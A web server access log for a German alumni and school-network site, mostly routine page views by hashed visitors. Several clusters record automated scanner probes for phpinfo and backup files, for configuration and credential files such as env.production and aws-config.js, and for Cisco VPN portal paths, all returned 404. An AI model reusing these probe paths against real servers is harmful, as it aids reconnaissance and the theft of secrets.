1cc07f48532d610b69cc7988b26cc51417a729879f95be6c9c56d4f8ddfe9870;2025-11-17 06:30:05;;/personen/alumni/schule/68470;GET;200
a422fd29867c5aa4f3a2b33ff75cdc7c36989324ec36b5d6ab188354bf23de57;2025-11-17 06:31:52;;/themen/details/abschied-aus-moabit;GET;200
c08818238b3baf0c9d029e5a70d4575408afb29c6249b38f137fd700a2f37cd1;2025-11-17 06:34:03;;/login;GET;200
0b92832033f75cbc4987894d09bd4095c55570fd5403a3497772a15fc9da791a;2025-11-17 06:42:02;;/personen/alumni/schule/4240628;GET;200
75bca399af191317754a914a78af1e258bffacd074e364d5c0c1afaca292ea8d;2025-11-17 06:47:26;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-17 06:52:27;;/personen/alumni/schule/SHH001;GET;200
63d5b6f319713c9ae1bed418a6b5b5e55122b9c7c706805d49a8198ccf82ecb7;2025-11-17 06:56:53;;/personen/alumni/schule/66345;GET;200
103ace3a26f883e441152f3990182adb9f3b7218c52a6a98e4f1de7409344129;2025-11-17 06:59:25;;/;GET;200
103ace3a26f883e441152f3990182adb9f3b7218c52a6a98e4f1de7409344129;2025-11-17 07:03:41;;/webui/;GET;404
ff50c2bf076248cd562f2e7fa30c8d9051e63e17850f44716fdabda179ff539f;2025-11-17 07:08:31;;/;GET;200
f35d76c4cd4aad70a669eeba36b521159a65a36cffa9e125b8e168f15eb5e314;2025-11-17 07:11:48;;/personen/alumni/schule/5826;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-17 07:12:27;;/personen/alumni/schule/183052;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-17 07:15:28;;/personen/alumni/schule/04A06;GET;200
897e09f7e3d920d419492a9a35afe85423c211b17bdef3a91e03f1615dbbacca;2025-11-17 07:18:12;;/;GET;200
bd99f03c365cf4e7a4d70f3a52cfd237a7d6db06108d95d05111a45e87f9ef3d;2025-11-17 07:19:12;;/?page=docs-sql;GET;200
bd99f03c365cf4e7a4d70f3a52cfd237a7d6db06108d95d05111a45e87f9ef3d;2025-11-17 07:19:15;;/;GET;200
4d0e6b308d812411a1cb1d4543c3c89fc244784ce2fa53d9ee420fd3b46c87d6;2025-11-17 07:19:16;;/?page=docs-sql;GET;200
190cd7855b395928d1e15e76d5a50f6ea332fdf3d031fb0f4e4d2b6b9532fece;2025-11-17 07:26:28;;/personen/alumni/schule/4440012;GET;200
d4c5daed9381398a97e47b3124345b06961953e180db8a845369962ee7934e68;2025-11-17 07:29:57;;/;HEAD;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-17 07:37:30;;/logout;GET;302
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-17 07:37:31;;/;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-17 07:37:51;;/;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-17 07:37:52;;/;GET;200
e31e0da11aa9fe82128577fe5a95d87f4ae3158d7b3636766f9b3593c5ea045b;2025-11-17 07:38:23;;/personen/alumni/schule/4240545;GET;200
74520e7566df6eb0643621903cde18cbafd42dce0d87978b3adebc7fa4940926;2025-11-17 07:41:17;;/personen/alumni/schule/67210;GET;200
8c7821c8f1fdc1ba0b354df90dd067357e61988e1f372be4c972c3093eb4ccfc;2025-11-17 07:57:41;;/personen/alumni/schule/MP002;GET;200
f9cf246f701664435d3c2a43bb318b0019fd47ec8a123396b26399e69751034c;2025-11-17 08:11:22;;/gruppen;GET;200
3be1390142cbdbaaeb8e35f36f4b57e022d7364db64ea32d1e306d39c8820fe1;2025-11-17 08:14:21;;/;GET;200
4044202a225c42ac8bb1cf44c6ed80a8dbb3c8d6ace66f40a03361baa2c337c4;2025-11-17 08:15:47;;/personen/alumni/schule/HS002;GET;200
dbacc4686b86f2b8de8cf65abc7f32633123f98ff059b46b0478752707b6ad72;2025-11-17 08:24:00;;/themen/details/abschied-aus-moabit;GET;200
2a01c1fd3852e07e2033f7b97ce07e910289c735e4ed06b9c7558adf04123e75;2025-11-17 08:24:52;;/themen/details/abschied-aus-moabit;GET;200
4d0e6b308d812411a1cb1d4543c3c89fc244784ce2fa53d9ee420fd3b46c87d6;2025-11-17 08:24:56;;/themen/details/der-start-ins-studium;GET;200
7a9312b0d6adf89c81cd068e32139ada047406a634abdac3b123aa07328af76c;2025-11-17 08:27:28;;/personen/alumni/schule/620014;GET;200
583140b523b64a02b238978ba4106588cc3a454b5e646aa6a9ad1827fce2e28f;2025-11-17 08:31:30;;/personen/alumni/schule/59043;GET;200
a6e3cde69d15c75b045b598460f2b2be8b75b1f4bb9b124d2fc7ec41c0d49c28;2025-11-17 08:32:27;;/;GET;200
aad7698feaaa51e714c1cf93d0fa995a035cd1bf3136b36f05902a2a096ed0b8;2025-11-17 08:46:25;;/personen/alumni/schule/68470;GET;200
4d0e6b308d812411a1cb1d4543c3c89fc244784ce2fa53d9ee420fd3b46c87d6;2025-11-17 08:52:33;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
4d0e6b308d812411a1cb1d4543c3c89fc244784ce2fa53d9ee420fd3b46c87d6;2025-11-17 08:52:38;;/themen?category=bildung;GET;200
d9bec6cab084b4235de8f09e4410dc7115977a3d4e0984541856f745ea76591e;2025-11-17 08:52:53;;/;GET;200
93653c3665d3cbb785ca6365c6833a2a6cd63b467a16703ffab776a701f5e497;2025-11-17 09:02:34;;/rechtliches/datenschutz;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-17 09:05:09;/personen/alumni/schule/4240404;/personen/alumni/schule/HS002;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-17 09:06:34;/themen/details/erfolgreich-durch-die-abiturprufungen;/themen/details/fotografie-als-kunst-und-ausdruck;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-17 09:07:56;/personen/alumni/schule/4240404;/personen/alumni/schule/5505;GET;200
5f1458038bfe58ec28484562ee0c215fade250963332703109321ab54638d839;2025-11-17 09:09:23;/veranstaltungen/details/wohnzimmerkonzert;/veranstaltungen/details/wohnzimmerkonzert;GET;200
959ea80fcea15f6fa0746a82228fefba48fdb43f09fd2249462e3171c35a80a3;2025-11-17 09:12:22;/;/;GET;200
74dc20c275cb64ca0f4cb0c43555d504c0d22c4f518af42be20d0cba1da9eb4f;2025-11-17 09:18:25;;/rechtliches/green-data;GET;200
d8684a2a9f8d78cb8d36338f7769e23fa41dee8de3cbb509629ee61a0fb130ce;2025-11-17 09:25:39;;/;GET;200
9b604752b5a2ed961cf737026b8fea6c9f085b59960388517b9c7c041fa19fd1;2025-11-17 09:27:40;;/;OPTIONS;405
d424d12edf8115b3dc8f183b26b49d8ad8ed97757f7b9402d29ba7ed2e61cebb;2025-11-17 09:29:19;;/;GET;200
f6512131e2cf8bd5d658004fd8a645c4aca60dd2ff3b22cd9a9a28f09ed9e261;2025-11-17 09:32:47;;/rechtliches/impressum;GET;200
bef6848d851ec143f4d56cbca946a27f19ae05207808b73ed7fec3c9338f27ba;2025-11-17 09:48:03;;/personen/alumni/schule/5503;GET;200
f30b8535f65e5a91899ac309bfb3f8945681536ed0cebfc7b1961e73b96769e4;2025-11-17 09:52:37;/;/;GET;200
fff729ece68aa638648a5b61df635bc19ea5ff21b5fac69e953e363cd7f37130;2025-11-17 09:52:58;;/;GET;200
fff729ece68aa638648a5b61df635bc19ea5ff21b5fac69e953e363cd7f37130;2025-11-17 09:53:17;;/%22https:/cdnjs.cloudflare.com/ajax/libs/emojionearea/3.4.2/emojionearea.min.js%22;GET;404
fff729ece68aa638648a5b61df635bc19ea5ff21b5fac69e953e363cd7f37130;2025-11-17 09:53:17;;/%22https:/code.jquery.com/jquery-3.6.0.min.js%22;GET;404
fff729ece68aa638648a5b61df635bc19ea5ff21b5fac69e953e363cd7f37130;2025-11-17 09:55:25;;/.gitlab-ci.yml;GET;404
fff729ece68aa638648a5b61df635bc19ea5ff21b5fac69e953e363cd7f37130;2025-11-17 09:55:25;;/config.json;GET;404
fff729ece68aa638648a5b61df635bc19ea5ff21b5fac69e953e363cd7f37130;2025-11-17 09:55:26;;/config.js;GET;404
fff729ece68aa638648a5b61df635bc19ea5ff21b5fac69e953e363cd7f37130;2025-11-17 09:55:27;;/aws-config.js;GET;404
fff729ece68aa638648a5b61df635bc19ea5ff21b5fac69e953e363cd7f37130;2025-11-17 09:55:27;;/aws.config.js;GET;404
fff729ece68aa638648a5b61df635bc19ea5ff21b5fac69e953e363cd7f37130;2025-11-17 09:55:37;;/%22https:/ga.jspm.io/npm:es-module-shims@1.10.0/dist/es-module-shims.js%22;GET;404
096d06be9fb153a9c0a5f0b4d8135e5d0c6959d6b7f3b4008de86fe9511fb5e7;2025-11-17 10:01:34;;/personen/alumni/schule/59026;GET;200
ed349bcef0b3ec067ccc79965e82f63b4c87aec15106de9a2d821464bd7b548c;2025-11-17 10:01:52;;/personen/alumni/schule/183052;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-17 10:02:04;/personen/alumni/schule/4240404;/personen/alumni/schule/5507;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-17 10:03:30;/gruppen/plausch/ai-driven-programme;/gruppen/hobby/biologie;GET;302
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-17 10:03:32;/gruppen/plausch/ai-driven-programme;/gruppen;GET;200
a79bcb3dc2cd777abedc15d44e7c861071454f37349493b436c177a8ddbee55d;2025-11-17 10:08:59;;/personen/alumni/schule/4540118;GET;200
26b62954801998c151e1d9a2dbca4562851fe81ad142d16e3248b1cd19683d8c;2025-11-17 10:09:14;;/+CSCOL+/Java.jar;GET;404
26b62954801998c151e1d9a2dbca4562851fe81ad142d16e3248b1cd19683d8c;2025-11-17 10:09:16;;/+CSCOE+/logon_forms.js;GET;404
26b62954801998c151e1d9a2dbca4562851fe81ad142d16e3248b1cd19683d8c;2025-11-17 10:09:17;;/+CSCOL+/a1.jar;GET;404
26b62954801998c151e1d9a2dbca4562851fe81ad142d16e3248b1cd19683d8c;2025-11-17 10:09:18;;/+CSCOE+/transfer.js;GET;404
37eecc1f2041348110b9101ee2703c810e61ccd87f99976d5fc0279ac90718a5;2025-11-17 10:12:47;;/personen/alumni/schule/5505;GET;200
3548e83729721936d16585610a758df116774b3c04bef9e508531f212feb180d;2025-11-17 10:24:50;;/personen/alumni/schule/190962;GET;200
4044202a225c42ac8bb1cf44c6ed80a8dbb3c8d6ace66f40a03361baa2c337c4;2025-11-17 10:37:59;;/personen/alumni/details/andie-jahnke;GET;200
7a9312b0d6adf89c81cd068e32139ada047406a634abdac3b123aa07328af76c;2025-11-17 10:46:54;;/personen/alumni/schule/4240628;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-17 10:48:03;/personen/alumni/schule/4240404;/personen/alumni/schule/4240628;GET;200
3b3084775ec3135d94b7a63767ae7d833481a8f7275f1fed99c80e7179b6aa54;2025-11-17 10:49:59;;/personen/alumni/schule/185826;GET;200
c5c9bc83315ce45d2d8593608461497f05758f4241d1ab5df80701a742e7f5ad;2025-11-17 11:01:46;;/personen/alumni/schule/170720;GET;200
6a58c032d91bd461af66b60cf22dea35cdbf5c530ab97bdef7dcff116d9cb961;2025-11-17 11:04:49;;/sitemap.xml;GET;200
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:11:35;;/;GET;200
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:11:42;;/assets/app/form.js;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:11:49;;/assets/@symfony/ux-turbo/turbo_controller.js;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:11:50;;/assets/app/core.js;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:11:54;;/assets/controllers/form-collection_controller.js;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:11:55;;/assets/controllers/hello_controller.js;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:12:02;;/assets/@symfony/stimulus-bundle/controllers.js;GET;404
a98890b481120d1bef68623119337f9622605ecd51003b53683dd60fa25645a4;2025-11-17 11:12:56;;/gruppen/interesse/teamarbeit;GET;200
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/server.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/test.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/php.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/pi.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/phpinfo;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/phptest.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/serverinfo.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/info.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/php_version.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/phpinfo.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/phpinfo.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/i.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/info2.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/debug.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/_profiler/phpinfo;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/check.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/phpversion.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/info1.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/info.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/php_info.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/diagnostic.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/php_info.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/test.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/phpinfo.php.backup;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/test.php.bak;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/phpinfo.php.bak;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/php_info.php.bak;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/php_info.php.orig;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/test.php.backup;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/phpinfo.php.orig;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/php_info.php~;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/info.php.bak;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/phpinfo.php.old;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/test.php.old;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/info.php~;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/php_info.php.backup;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/php_info.php.old;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/test.php.orig;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/info.php.orig;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/info.php.backup;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/phpinfo.php~;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:13:41;;/info.php.old;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:14:21;;/test.php~;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:14:21;;/test.php.swp;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:14:21;;/php_info.php.swp;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:14:21;;/phpinfo.php.swp;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:14:22;;/phpinfo.php.tmp;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:14:22;;/info.php.swp;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:14:54;;/info.php.tmp;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:14:54;;/php_info.php.tmp;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:14:54;;/admin/phpinfo.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:14:54;;/test.php.tmp;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:14:54;;/admin/phpinfo.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:14:54;;/test/info.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:14:54;;/dev/phpinfo.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:14:54;;/test/phpinfo.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:14:54;;/admin/info.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:14:54;;/test/phpinfo.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:14:54;;/admin/info.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:14:54;;/test/info.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:16:21;;/scripts/phpinfo.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:16:21;;/dev/phpinfo.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:16:21;;/scripts/info.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:16:21;;/includes/phpinfo.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:16:21;;/dev/info.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:16:21;;/tmp/info.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:16:21;;/tmp/info.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:16:21;;/includes/info.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:16:21;;/tmp/phpinfo.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:16:21;;/dev/info.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:16:21;;/scripts/phpinfo.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:16:22;;/includes/info.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:16:22;;/includes/phpinfo.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:16:22;;/tmp/phpinfo.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:16:22;;/scripts/info.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:17:34;;/public/phpinfo.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:17:34;;/public/info.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:17:34;;/public/info.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:17:34;;/public/phpinfo.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:17:34;;/web/info.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:17:34;;/web/phpinfo.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:17:35;;/web/phpinfo.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:17:37;;/web/info.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:17:37;;/www/info.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:17:37;;/www/phpinfo.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:17:37;;/www/info.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:17:37;;/www/phpinfo.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:17:37;;/site/phpinfo.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:17:37;;/site/info.php;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:17:37;;/site/phpinfo.php.save;GET;404
e8461d7d7086e77cf64fcfb23e04faf5697a84ddd207d9cc32d0119f8d7ee108;2025-11-17 11:17:37;;/site/info.php.save;GET;404
ce8119a115d47469fdc30e280018b78c4dbe6ed75b5383bdae1ada573741b8ce;2025-11-17 11:18:12;;/;GET;200
301e666ea0c944e347b624f4972b2b977e5cdb3645f451e1a71103667a2da7a8;2025-11-17 11:19:26;;/;GET;200
1da863cb3fe4a7dc97ab0032cfb6b7f9aa5b983010a79379e99dd2372775a701;2025-11-17 11:24:04;;/themen?category=politik;GET;200
06dd7313b7120736ac2e00cc5340c9dcb90be3f3cd207c5d83e6a8a96e0281a6;2025-11-17 11:32:54;;/login;GET;200
03f502e623b5083db2d123f54a7a1239d21ee7cf98240bb527fd3a343b32ba8b;2025-11-17 11:35:42;;/themen/details/abschied-aus-moabit;GET;200
de44493e1b9272adfa9d17f7ddd8b4e1d5ac5d819d186cbfdf7daf4180fe69e7;2025-11-17 11:41:20;;/env.production;GET;404
de44493e1b9272adfa9d17f7ddd8b4e1d5ac5d819d186cbfdf7daf4180fe69e7;2025-11-17 11:41:21;/env.production;/env.production;GET;404
48f47269475299b2280f29b06e3e0ccae8b1e3fadb8c403c9b87611fda59dfa6;2025-11-17 11:46:56;;/;GET;200
0a8582ec0f2169ac2d7f670c8a17bf6448c084ea227e03d519b58ad69a4c97c4;2025-11-17 11:47:50;;/;GET;200
d0a0e926dbd1bebe304e465cb407ed6babfe146cc50357b0c3dfe75f8fa93b8a;2025-11-17 11:48:19;;/;GET;200
7db3d00abe3b82f209301e3dae1a6fee28b448af129c5829ef8d17ff5c582a54;2025-11-17 11:48:25;;/;GET;200
122e14e2924a4afd2f98bdb0498bbbf2c1e654ef73ffb807f1fc1bed246c385d;2025-11-17 11:50:25;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-17 11:53:24;/gruppen/hobby/schreinern-und-bauen;/personen/alumni/schule/MP002;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-17 11:54:47;/gruppen/hobby/schreinern-und-bauen;/personen/alumni/schule/600027;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-17 11:56:08;/gruppen/hobby/schreinern-und-bauen;/gruppen/hobby/geometrie;GET;302
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-17 11:56:09;/gruppen/hobby/schreinern-und-bauen;/gruppen;GET;200
658acd2e575e7d70ce5f4eeecaa00ea355e8d8e4c368c4fea3ffbeabd402887b;2025-11-17 12:06:49;;/personen/alumni/schule/5501;GET;200
eb639149a613179817bc4e64920b2f932d6577755ff6999fed00f2838d8a8595;2025-11-17 12:07:38;;/gruppen/interesse/entrepreneurship;GET;200
d814bf1cbaa2865ddef7fa94743b914714b72091e6e66f13082bad0865e0dc7e;2025-11-17 12:13:09;;/personen/all/2;GET;200
d0be8bb7fd0be6aab6961e33f9c0abdac67db68697bff4dda37e33941f51e588;2025-11-17 12:16:42;;/;GET;200
e4223be64f6dfca6cf8cb59b6a678a27885dd6c9563f594abc0404922b166aca;2025-11-17 12:17:31;;/;GET;200
